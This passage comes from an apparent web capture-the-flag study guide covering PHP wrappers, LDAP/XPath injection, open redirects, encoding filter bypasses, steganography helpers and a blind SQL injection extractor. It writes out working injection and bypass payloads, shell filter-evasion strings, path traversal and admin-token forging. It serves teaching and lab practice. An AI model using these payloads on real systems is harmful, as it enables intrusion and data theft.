raw request → proxy validation → PHP parsing → framework normalization → sinkUse a source-defined echo/debug endpoint if present to see what arrives. JSON bodies parsed with json_decode are not automatically parsed like $_GET / $_POST.
4. Stream wrappers and file operations For a PHP file-read/include sink:
php://filter/read=convert.base64-encode/resource=index.phpThis can disclose readable source as Base64 without executing it in common include contexts. It does not bypass arbitrary directory allowlists, file-existence checks, suffix appending, or wrapper restrictions automatically. See LFI.
data://, remote URLs, archive wrappers, and php://input each have different configuration and sink preconditions. Identify whether the code reads bytes, includes PHP, or only checks metadata.
5. extract and mass assignment extract($_GET);This can create/overwrite variables depending on the extract flags and existing variable scope. It does not automatically overwrite variables defined afterward. Trace the order:
initial role assignment → extract → role checkPotential probe if the source shows $is_admin overwritten:
?is_admin=1The server’s actual type/comparison determines whether 1, true, or a string works.
6. Quick offline checks Use the web helper snippets to compute digests and decode Base64. Python does not reproduce PHP’s loose comparison rules; test PHP behavior using the installed PHP version when available.
Tool map: CyberChef · Python · Burp.
Official references: comparison operators, parse_str, extract, stream wrappers.

title: LDAP / XPath Injection
content:
LDAP and XPath Injection These query languages do not share SQL grammar. Quotes, comments, schema discovery, and wildcard meaning depend on the actual parser.
LDAP: identify a filter string Possible source:
(uid=INPUT) (&(uid=USERINPUT)(userPassword=PASSINPUT))Useful first probes for a search filter:
alice * alice* ( ) \ Result Interpretation * returns many entries Wildcard accepted, possibly intended search behavior Unbalanced ( or ) gives filter syntax error Potential filter-string construction Structured filter injection changes logic Stronger evidence of LDAP injection For source exactly constructing (&(uid=INPUT)(department=public)), this input:
*)(|(department=*)(department=produces:
(&(uid=*)(|(department=*)(department=)(department=public)))It changes the query grouping so the intended department restriction is no longer independently required. This specific closure depends on the exact original filter. Do not apply it to a different login template.
For a simple (uid=INPUT) filter, * already expands the query. For a login that first searches and then performs an LDAP bind with the supplied password, a broad search alone does not bypass the bind.
Prefix oracle If the response reveals whether an entry exists, and a field supports substring matching:
(uid=a*) (uid=b*) (uid=ad*) (uid=adm*)These are complete conceptual filters. Insert only the relevant value if the application constructs the rest. Narrow to a unique entry and field; matching behavior varies by attribute schema and server.
Literal LDAP filter escapes Character Filter escape * \2a ( \28 ) \29 \ \5c NUL \00 These are LDAP filter escapes, not DN escaping and not URL encoding. A properly escaped literal asterisk should not act as a wildcard. Compare escaped and unescaped input to understand the layer.
XPath: confirm a boolean expression Possible XPath 1.0 query:
//users/user[username='INPUT' and password='PASS']For the username input, compare:
' or 1=1 or 'a'='b ' or 1=2 or 'a'='bFor this exact template, the true input becomes:
//users/user[username='' or 1=1 or 'a'='b' and password='PASS']The always-true middle disjunct makes the predicate true independently of the password. The false control is false provided no user has an empty username. A shorter input such as ' or '1'='1 leaves the password test attached to that comparison by and precedence, so both controls can fail with a wrong password. XPath has no SQL -- comment; reconstruct the entire expression instead of copying SQL suffixes.
XPath: enumerate with a boolean oracle XPath 1.0 expressions useful inside an established oracle:
count(//users/user)>1 string-length(string((//users/user/password)[1]))>10 substring(string((//users/user/password)[1]),1,1)='a' starts-with(string((//users/user/password)[1]),'flag{') name(/*)='users' count(/*/*)>2First identify the XML structure with name, count, and child navigation. XPath 1.0 does not have a universally available ascii() function. Manual candidate-character equality / contains partitioning can replace SQL-style character-code extraction.
XPath versions and host libraries differ. A visible XML document does not prove user input reaches XPath. XXE is a separate XML parser issue.
Tool map: Burp · Python · Notepad++.
References: LDAP filter syntax RFC 4515, XPath 1.0, OWASP XPath injection.

title: Open Redirect / URL Parsing
content:
Open Redirect and URL Parsing Look for next, return, redirect, url, continue, callback, or client-side navigation reading a URL parameter.
1. Establish the navigation sink GET /login?next=%2Fprofile HTTP/1.1 Host: ctf.invalidDetermine whether navigation is:
An HTTP Location header on a 3xx response. An HTML <meta http-equiv="refresh">. A JavaScript assignment such as location = input. A link that only navigates when clicked. Reflection in an anchor or message is not automatic redirection. Inspect the actual destination in the browser as well as the response headers.
2. Test URL components independently Raw input candidates:
/profile https://ctf.invalid/profile https://YOUR-LAB-HOST/ //YOUR-LAB-HOST/ https://ctf.invalid.evil.invalid/ https://ctf.invalid@YOUR-LAB-HOST/ https://YOUR-LAB-HOST/#ctf.invalid https://YOUR-LAB-HOST/?allowed=ctf.invalid Candidate What it tests Absolute external URL No destination validation //host/ Network-path reference / missing scheme checks Allowed name as prefix of another host Prefix match instead of host equality allowed@other Userinfo mistaken for hostname Allowed name in fragment/query Substring match over full URL YOUR-LAB-HOST is a placeholder for the challenge-provided / permitted destination. Never infer the host from visual string position: parse scheme, userinfo, host, port, path, query, fragment.
3. Encoding and parser differences Try encoded variants only when a real decode/reparse stage exists:
%2F%2FYOUR-LAB-HOST%2F https%3A%2F%2FYOUR-LAB-HOST%2FA browser, reverse proxy, server framework, and URL library can normalize backslashes, encoded separators, and duplicate parameters differently. There is no universal backslash bypass. Capture the final parsed destination on the actual component.
4. Follow the chain An open redirect might be useful for:
OAuth allowlisted callback → redirect endpoint → permitted result collector SSRF validator accepts first URL → fetcher follows unchecked redirect admin bot visits same-origin link → navigates to a permitted challenge pageEach chain needs its own preconditions. A redirect alone does not provide server-side fetch, XSS, or token disclosure. URL fragments are not sent as HTTP request targets, though client-side code can read them.
5. Negative controls Confirm the normal same-origin destination works. Try a clearly invalid scheme / URL and record rejection. Try the candidate bypass, inspect Location and browser destination. Verify the relevant follow-up behavior, such as an SSRF response or OAuth callback handling. Tool map: Burp · Chrome · CyberChef.
References: WHATWG URL Standard, PortSwigger DOM open redirect.

title: Offline Python Toolkit
content:
Offline Python steganography toolkit Download helpers before the event and rehearse with a known message. These tools do not use network requests or AI. Whether prewritten scripts and optional packages are permitted is determined by your event’s rules.
1. Downloadable helpers Helper Dependencies Purpose file_carver.py Standard library Signature candidate scan and explicit bounded-range extraction image_lsb.py Optional Pillow Channel/plane bit extraction and lossless visible bit-plane PNG text_unicode.py Standard library Escaped Unicode inspection and two-code-point bitstream extraction Use Python 3.9 or later. All three accept --help, preserve the source and refuse to overwrite an existing output. Work from downloaded local copies:
python3 file_carver.py --help python3 image_lsb.py --help python3 text_unicode.py --helpPillow is imported after command-line parsing, so the image helper’s help remains usable when Pillow is absent. The actual extraction prints a clear dependency error. No automatic installation occurs.
2. Carving recipes python3 file_carver.py scan original.bin python3 file_carver.py scan original.bin --magic 89504e470d0a1a0a python3 file_carver.py extract original.bin selected.bin --offset 0x1000 --length 8192 python3 file_carver.py extract original.bin trailer.bin --offset 0x1000 --to-eofThe offsets and lengths above are examples. Defaults: at most 100 signature hits and at most 64 MiB copied. Use --max-hits or --max-bytes to change them deliberately. A signature scan does not validate file length or structure; choose the interval using the container format.
3. Image recipes python3 image_lsb.py carrier.png red.bin --channels r --bit 0 --bytes 256 python3 image_lsb.py carrier.png rgb.bin --channels rgb --pack msb --order row --bytes 256 python3 image_lsb.py carrier.png shifted.bin --channels bgr --skip-bits 3 --bytes 256 python3 image_lsb.py carrier.png palette.bin --channels i --bytes 256 python3 image_lsb.py carrier.png alpha-plane.png --channels a --bit 0 --planei is allowed only for palette mode P; a only when the actual mode has alpha. No conversion happens silently. The default extraction cap is 1 MiB. An incomplete last byte is dropped and reported. --bit 1 selects one sample bit plane, not two bits per sample.
See image extraction settings for traversal, byte packing, frame and channel definitions.
4. Text recipes python3 text_unicode.py message.txt --limit 300 python3 text_unicode.py message.txt --all --limit 100 python3 text_unicode.py message.txt --encoding utf-16 python3 text_unicode.py message.txt --zero U+200B --one U+200C --output hidden.bin python3 text_unicode.py message.txt --zero U+200B --one U+200C --pack lsb --skip-bits 1 --output alternative.binCode-point inspection never prints the original control characters directly. Input decoding is strict; no normalization, error-dropping or stripping occurs. Extraction selects only the two declared symbols and ignores other cover text.
5. Known-message image exercise This creates a tiny lossless fixture containing flag{lsb_demo} in each red sample’s low bit. Pillow is required. The first encoded bit is the MSB of the first output byte.
from pathlib import Path from PIL import Image message = b"flag{lsb_demo}" bits = [(byte >> shift) & 1 for byte in message for shift in range(7, -1, -1)] image = Image.new("RGB", (len(bits), 1), (100, 100, 100)) for x, bit in enumerate(bits): image.putpixel((x, 0), (100 | bit, 100, 100)) with Path("demo-lsb.png").open("xb") as output: image.save(output, format="PNG")python3 image_lsb.py demo-lsb.png demo-message.bin --channels r --bytes 14Check exact bytes, not just a substring:
from pathlib import Path assert Path("demo-message.bin").read_bytes() == b"flag{lsb_demo}"The message has 14 bytes. Using the wrong channel should yield a different stream and fail this assertion, which is a useful negative control.
6. Known-message Unicode exercise from pathlib import Path message = b"flag{unicode_demo}" symbols = "".join("\u200c" if (byte >> bit) & 1 else "\u200b" for byte in message for bit in range(7, -1, -1)) with Path("demo-unicode.txt").open("xb") as output: output.write(("ordinary cover text" + symbols).encode("utf-8"))python3 text_unicode.py demo-unicode.txt --zero U+200B --one U+200C --output demo-unicode.binfrom pathlib import Path assert Path("demo-unicode.bin").read_bytes() == b"flag{unicode_demo}"7. Reproducible output record from pathlib import Path import hashlib p = Path("demo-message.bin") data = p.read_bytes() print("bytes", len(data), "sha256", hashlib.sha256(data).hexdigest()) print("preview", repr(data[:160]))For large data, use the streaming hash from triage. repr avoids confusing embedded controls with terminal output. Keep binary outputs even if a text preview looks broken.
8. Common preparation failures Failure Fix ModuleNotFoundError: PIL Pillow unavailable; use approved zsteg or prepare permitted dependency before the event File exists Choose a new output filename Carver interval exceeds cap Recheck extent before explicitly raising --max-bytes Unsupported image mode Determine sample representation instead of silently converting Unicode decode error Identify actual encoding from bytes/BOM Output starts correctly then noise Determine payload length/header rather than treating all carrier bits as text Related tool notes: Python, zsteg, CyberChef.

title: Encoding & Filter Bypasses
content:
Encoding, filters and parser differences Write down the bytes at each layer. Most failed payloads come from the wrong context, a changed transport encoding, or a bypass aimed at a parser the input never reaches.
Your editor → HTTP transport → URL/form/JSON decoder → validation → framework parsing → query/template/shell/path parser → output encodingMove validation in that diagram if source shows a different order. The same %27 can be a quote, literal text, or a blocked token depending on the point inspected.
1. Transport reference Raw byte/character URL percent form Notes Space %20 + means space only for form-style decoding + %2B Literal plus in form values ' %27 SQL quote only after URL decoding " %22 Does not replace JSON escaping # %23 Raw URL fragment is not sent to the server & %26 Raw form/query & separates fields = %3D Useful inside encoded parameter values / %2F Routers/proxies may treat encoded separators specially \ %5C Windows separator or parser-specific escape % %25 Encodes a percent; important for a second decoding stage Tab / LF / CR %09 / %0A / %0D Acceptance and normalization vary by sink In Burp’s decoded parameter editor, enter the raw intended value and inspect the encoded request. In its raw editor, encode only what the transport requires. Do not encode the same layer twice accidentally.
2. Nested URL example Intended inner URL:
http://127.0.0.1:5000/search?q=a&limit=1As the value of the outer url parameter:
url=http%3A%2F%2F127.0.0.1%3A5000%2Fsearch%3Fq%3Da%26limit%3D1Without %26, the outer parser may create a separate limit parameter instead of passing it to the inner service. Conversely, encoding the inner query twice can leave %26 in the final URL rather than an argument separator.
3. JSON is not a form body {"name":"a\"b","path":"C:\\temp\\flag.txt"} {"name":"\u0027"} {"name":"%27"}The first document contains a quote and Windows backslashes after JSON decoding. \u0027 becomes a quote in a standard JSON string; %27 normally remains percent-sign text unless the application explicitly URL-decodes it later.
Duplicate JSON keys are not a portable first/last-value bypass. Compare actual parser behavior and downstream reserialization.
4. Identify what the filter really does Use a benign marker and compare the returned/stored value:
AAunionBB AAUNIONBB AAUnIoNBB AAuniuniononBB Observation Candidate behavior Follow-up Entire request rejected Validation/WAF Compare status, body and whether sink runs Only lowercase disappears Case-sensitive substring removal Mixed case helps only if sink is case-insensitive uniunionon becomes union One-pass stripping Test whether remaining token reaches the sink Token removed repeatedly Recursive cleanup Double-writing the token will not help Stored raw but displayed escaped Output encoding Inspect raw storage/next consumer; do not confuse display with sink A SQL case trick does not automatically apply to case-sensitive filenames or JavaScript property names.
5. Parser-specific substitutions Context Candidate Required condition SQL whitespace 1/**/AND/**/1=1 SQL dialect accepts block comments here MySQL-specific syntax /*!50000SELECT*/ Versioned comment syntax applies and version gate matches POSIX shell spaces cat${IFS}/flag.txt Shell expands/splits variable outside quotes POSIX shell keyword ca''t /flag.txt Shell quote concatenation occurs after filter URL path %2e%2e%2f Decode/normalize order differs from validation JSON keyword "\u0061dmin" Filter sees raw escape; JSON parser later emits admin HTML text < Becomes a literal < text character, not a new tag; another HTML parsing stage would be needed HTML entities do not decode inside ordinary JavaScript source as they do in HTML attributes. JavaScript escapes only work where JavaScript grammar permits them. URL encodings do not become SQL syntax without decoding first.
6. Normalization and parameter pollution role=user&role=admin role=admin&role=userCompare both orders and the two single-value controls. Record what validation sees and what the final sink sees. Depending on the stack, duplicate keys can become first value, last value, list, joined string or rejection.
For path filters, compare normalized vs raw values. For account identifiers, compare case, trailing spaces and Unicode only when the application has a concrete normalization discrepancy. Unicode “lookalike” punctuation is not necessarily interpreted as SQL/JavaScript syntax.
7. Offline standard-library encoding helper Run locally to prepare exact payload bytes; it sends no network request:
import base64 import json from urllib.parse import quote, unquote, urlencode payload = "../../flag.txt" print("URL:", quote(payload, safe="")) print("Form:", urlencode({"file": payload})) print("JSON:", json.dumps({"file": payload})) print("Base64:", base64.b64encode(payload.encode()).decode()) print("Bytes:", payload.encode().hex()) print("One decode:", unquote("%252e%252e%252f"))unquote() decodes percent escapes; unquote_plus() additionally changes + into spaces. Choose based on the actual transport. Python’s URL quoting documentation describes these differences.
8. Debugging checklist Capture a working baseline and preserve auth/state. Choose the exact parser context and a minimal probe. Inspect raw HTTP bytes after your editor transforms them. Compare a negative control. Identify the one filter/normalization step blocking the probe. Change only the representation relevant to that step. Confirm the intended final value reaches the sink. Related: SQLi, SSTI, command injection, CyberChef decoder recipes.
Reference: curl’s URL parser differences.

title: Python · Reusable Web Helpers
content:
Reusable Python for Web CTFs Prepared snippets for offline notes. The two downloads use the Python standard library. They do not need AI, an API key, or package installation. Use the event-permitted runtime and follow the event’s rules on saved code.
Download Purpose Network access web_helpers.py Hex, Base64, URL, XOR, hashes, JWT inspection / known-key HS256 signing None sqli_boolean.py Extract one scalar using an already-proven boolean GET oracle Only the endpoint you supply 1. Exact bytes in and out python web_helpers.py hex-decode --text 666c61677b64656d6f7d --output decoded.bin python web_helpers.py b64-decode --text 'ZmxhZ3tkZW1vfQ==' --output decoded.bin python web_helpers.py url-encode --text "' UNION SELECT NULL-- -" python web_helpers.py xor --file cipher.bin --key-hex 494345 --output plain.bin python web_helpers.py hashes --file sample.binThe helper does not add a newline to binary output. --text means UTF-8 text, --file means actual bytes, and --key-hex 494345 means the three bytes ICE, not the six ASCII characters 494345.
Small copyable equivalents import base64 from pathlib import Path raw = bytes.fromhex('666c61677b64656d6f7d') assert raw == b'flag{demo}' assert base64.b64decode(b'ZmxhZ3tkZW1vfQ==', validate=True) == raw Path('decoded.bin').write_bytes(raw)from urllib.parse import quote, unquote, unquote_plus payload = "' UNION SELECT NULL-- -" encoded = quote(payload, safe='') assert unquote(encoded) == payload assert unquote('a+b') == 'a+b' # URL percent decoding assert unquote_plus('a+b') == 'a b' # URL-encoded form decoding2. Inspect a JWT, without claiming verification python web_helpers.py jwt-inspect --file token.txtMinimal decoder:
import base64 import json token = 'eyJhbGciOiJub25lIn0.eyJyb2xlIjoidXNlciJ9.' for part in token.split('.')[:2]: raw = base64.urlsafe_b64decode(part + '=' * (-len(part) % 4)) print(json.loads(raw)) # Decoded header/payload only. This does not verify or authenticate the token.3. Sign HS256 when the challenge gives you the key Create claims.json:
{"header":{"alg":"HS256","typ":"JWT"},"payload":{"sub":"ctf-user","role":"admin"}}Store the exact known secret bytes in key.bin; a newline is a byte too.
python web_helpers.py jwt-sign-hs256 --file claims.json --key-file key.bin --output token.txtThis constructs an HMAC using a known key. It does not crack a key, convert an RSA token, or prove the server accepts your claims. Use only the algorithm and validation behavior actually established in the JWT workflow.
4. Boolean SQL extractor — what you must establish first Correct endpoint, parameter, session, and SQL context. Correct database engine and target scalar expression. A true body marker and a false body marker that cannot both appear. One stable target row. Use its real primary key or stable ordering. Example against a local / challenge SQLite search endpoint with found-product and no-products as its actual markers:
python sqli_boolean.py \ --url 'http://ctf.invalid/item' \ --parameter id \ --template '1 AND ({predicate})' \ --engine sqlite \ --expression '(SELECT flag FROM flags ORDER BY id LIMIT 1)' \ --true-marker 'found-product' \ --false-marker 'no-products' \ --max-length 128 \ --max-requests 2000Replace the host, query, markers, and template with what you already verified. For a quoted value, an example template is apple' AND ({predicate})-- -; quote that shell argument correctly or save the arguments in your own notes. The script URL-encodes the parameter for you.
What it does verify constant true/false controls → reject NULL target → binary-search length → binary-search printable ASCII codes → verify each character equality → recheck every code point and final lengthProgress goes to stderr; the final recovered value goes to stdout. HTTP errors, connection timeouts, and responses containing both/neither marker stop the run as unknown/incomplete, rather than corrupting the result.
Limits GET parameters only; no JSON/form requests or CSRF token refresh. Printable ASCII 32–126 only; adapt the extractor for non-ASCII/binary values. SQL Server LEN ignores trailing spaces; choose a hex or explicitly represented target if necessary. Application redirects / login fallbacks may hide an expired session; markers must distinguish real results. No time-based oracle, automatic engine fingerprinting, or table discovery. No checkpoint/resume; keep a stable endpoint and known extraction target. 5. Offline extraction logic you can adapt def binary_search_code(ask, expression, low=32, high=126): # ask(predicate) must return True/False, and raise on an unknown response. while low < high: midpoint = (low + high) // 2 if ask(f'{expression}>{midpoint}'): low = midpoint + 1 else: high = midpoint if not ask(f'{expression}={low}'): raise RuntimeError('Unstable oracle or out-of-range character') return chr(low)Read blind SQLi before adapting the transport. A wrong oracle is more damaging than a slow extractor.
Tool map: Python · uv · Burp · CyberChef.
